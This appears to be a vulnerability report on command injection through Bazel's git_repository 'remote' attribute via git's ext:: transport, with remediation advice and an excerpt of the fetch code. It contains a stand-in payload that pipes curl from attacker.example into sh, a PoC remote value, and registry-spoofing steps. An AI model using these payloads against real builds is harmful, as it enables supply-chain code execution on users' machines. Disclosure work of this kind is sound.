### Title
Command injection via unsanitized `remote` attribute reaching git's `ext::` transport in `git_repository` - (`tools/build_defs/repo/git_worker.bzl`)

### Summary
The `git_repository` repo rule takes a `remote` string attribute and forwards it verbatim into `git remote add origin <remote>` and subsequent `git fetch origin`, with no scheme validation and no `GIT_ALLOW_PROTOCOL` restriction. Because `git` itself supports the `ext::<shell command>` remote-helper transport, an attacker who controls the value of `remote` (e.g. a hostile/forked Bazel registry's `source.json`, which is directly forwarded to the `git_repository` rule per Bazel's Bzlmod registry protocol) can smuggle a command to be executed by the invoking user's machine during `bazel fetch`/`bazel build`. This mirrors the systeminformation CVE-2020-26274 bug class: an unsanitized externally-supplied string is passed into a subprocess argument that the underlying tool (`git`) itself interprets as a command.

### Finding Description
`git_repo()` in `tools/build_defs/repo/git_worker.bzl` builds a `_GitRepoInfo` with `remote = str(ctx.attr.remote)` [1](#0-0) , and `_update()` calls `add_origin(ctx, git_repo, ctx.attr.remote)` [2](#0-1) . `add_origin` runs `_git(ctx, git_repo, "remote", "add", "origin", remote)` [3](#0-2) , and `fetch()` subsequently invokes `git fetch origin ...` [4](#0-3) .

`remote` is declared as a plain mandatory `attr.string()` on the rule with no format/scheme validation [5](#0-4) . The execution helper `_execute()` passes the command list directly to `ctx.execute()` (avoiding shell-string interpolation) but explicitly does *not* sanitize or restrict which URL schemes `git` itself will honor; it only strips a fixed list of `GIT_*` local environment variables — `GIT_ALLOW_PROTOCOL` is not among them and is not set [6](#0-5) .

Git natively supports the `ext::<command>` remote-helper transport, where the command following `ext::` is executed as a shell command to serve as the transport for clone/fetch. Since the `remote` value is written unmodified into the git config and then used as the fetch target, a `remote` value such as `ext::sh -c "curl attacker.example/x|sh"` results in `git fetch origin` invoking that shell command, achieving command execution in the context of the Bazel invocation (as the user running `bazel fetch`/`bazel build`).

Bazel's Bzlmod registry protocol directly forwards a `remote` field from a registry's `source.json` for `git_repository`-typed module versions (see `docs/external/registry.mdx`: "the following fields are supported, and are directly forwarded to the underlying `git_repository` repo rule: `remote`, `commit`, ..."). Unlike `http_archive` (protected by `sha256`/`integrity`), `git_repository` has no content-hash mechanism that would bind or validate the `remote` string itself — a `commit` pin only verifies the checked-out tree, not the transport URL used to reach it. A hostile/mirrored registry, or an untrusted branch whose CI resolves a module via a custom `--registry`, can therefore supply an arbitrary `remote` string that is never checked against a digest.

### Impact Explanation
Arbitrary command execution on the machine performing the Bazel fetch, under the invoking user's privileges, triggered simply by resolving a dependency whose `git_repository` `remote` field is attacker-supplied. This satisfies the "integrity bypass leading to command execution" bar: no checksum or lockfile mechanism exists for the `remote` field to catch a hostile value, and the impact is full command execution, not merely DoS or sandbox containment.

### Likelihood Explanation
Requires a victim to fetch a module/repository whose `git_repository` `remote` attribute is attacker-controlled — e.g., via a compromised or spoofed Bazel module registry entry, or a malicious `source.json` served from an alternate/mirrored registry that a project has configured. This is a realistic supply-chain scenario for Bzlmod consumers who use non-default or third-party registries, and does not require MITM, credential access, or trusted root-repo BUILD/.bzl files — only that a hostile registry response for a module version is consumed.

### Recommendation
- Validate the `remote` attribute against an allow-list of expected schemes (`https`, `http`, `ssh`, `git`, `file` if explicitly permitted) and reject `ext::`/other command-capable transports in `git.bzl`/`git_worker.bzl`.
- Set `GIT_ALLOW_PROTOCOL` in the execution environment used by `_execute()` in `git_worker.bzl` to restrict git to a safe protocol list, similar to the existing `_GIT_LOCAL_ENV_VARS` hardening.
- Extend the Bzlmod registry `source.json` schema/handling to reject or explicitly flag `remote` values using unsafe transports, and document that `remote` is not integrity-protected akin to `sha256`.

### Proof of Concept
1. Stand up (or spoof, e.g. via a project's `--registry` override or a forked BCR) a registry module version whose `source.json` sets `"type": "git_repository"` and `"remote": "ext::sh -c \"touch /tmp/pwned\""`.
2. A victim adds a dependency on that module via `MODULE.bazel` (`bazel_dep`), using the attacker-influenced registry.
3. Running `bazel build` (or `bazel fetch`) resolves the module, invoking `git_repository` with the malicious `remote`; `git_worker.bzl`'s `add_origin`/`fetch` execute `git remote add origin ext::sh -c "touch /tmp/pwned"` followed by `git fetch origin`, causing git to execute the embedded shell command and create `/tmp/pwned` on the build machine.
4. A `src/test/shell/bazel/starlark_git_repository_test.sh`-style integration test can codify this: define a `git_repository` with `remote = "ext::sh -c 'touch $TEST_TMPDIR/pwned'"`, run `bazel build @g//:g`, and assert the marker file was created — confirming code execution outside any declared checksum or containment boundary.

def fetch(ctx, git_repo):
    args = ["fetch", "origin"]

    sparse_checkout_patterns_or_file = \
        getattr(ctx.attr, "sparse_checkout_patterns", None) or \
        getattr(ctx.attr, "sparse_checkout_file", None)
    if sparse_checkout_patterns_or_file:
        if _git_sparse_checkout_config(ctx, git_repo):
            # Use filter to disable downloading file contents until we set the `sparse-checkout` patterns.
            args.append("--filter=blob:none")
        else:
            print("WARNING: Sparse checkout is not supported. Doing a full checkout.")
            sparse_checkout_patterns_or_file = None

    args.extend(["--", git_repo.fetch_ref])
    st = _git_maybe_shallow(ctx, git_repo, *args)

    if sparse_checkout_patterns_or_file:
        _git_sparse_checkout(ctx, git_repo, sparse_checkout_patterns_or_file)

    if st.return_code == 0:
        return
    if ctx.attr.commit:
        # Perhaps uploadpack.allowReachableSHA1InWant or similar is not enabled on the server;
        # fall back to fetching all branches, tags, and history.
        # The semantics of --tags flag of git-fetch have changed in Git 1.9, from 1.9 it means
        # "everything that is already specified and all tags"; before 1.9, it used to mean
        # "ignore what is specified and fetch all tags".
        # The arguments below work correctly for both before 1.9 and after 1.9,
        # as we directly specify the list of references to fetch.
        _report_progress(ctx, git_repo, shallow_failed = True)
        _git(
            ctx,
            git_repo,
            "fetch",
            "origin",
            "--",
            "refs/heads/*:refs/remotes/origin/*",
            "refs/tags/*:refs/tags/*",
        )
    else:
        _error(ctx.name, ["git"] + args, st.stderr)

def _execute(ctx, git_repo, args):
    # "core.fsmonitor=false" disables git from spawning a file system monitor which can cause hangs when cloning a lot.
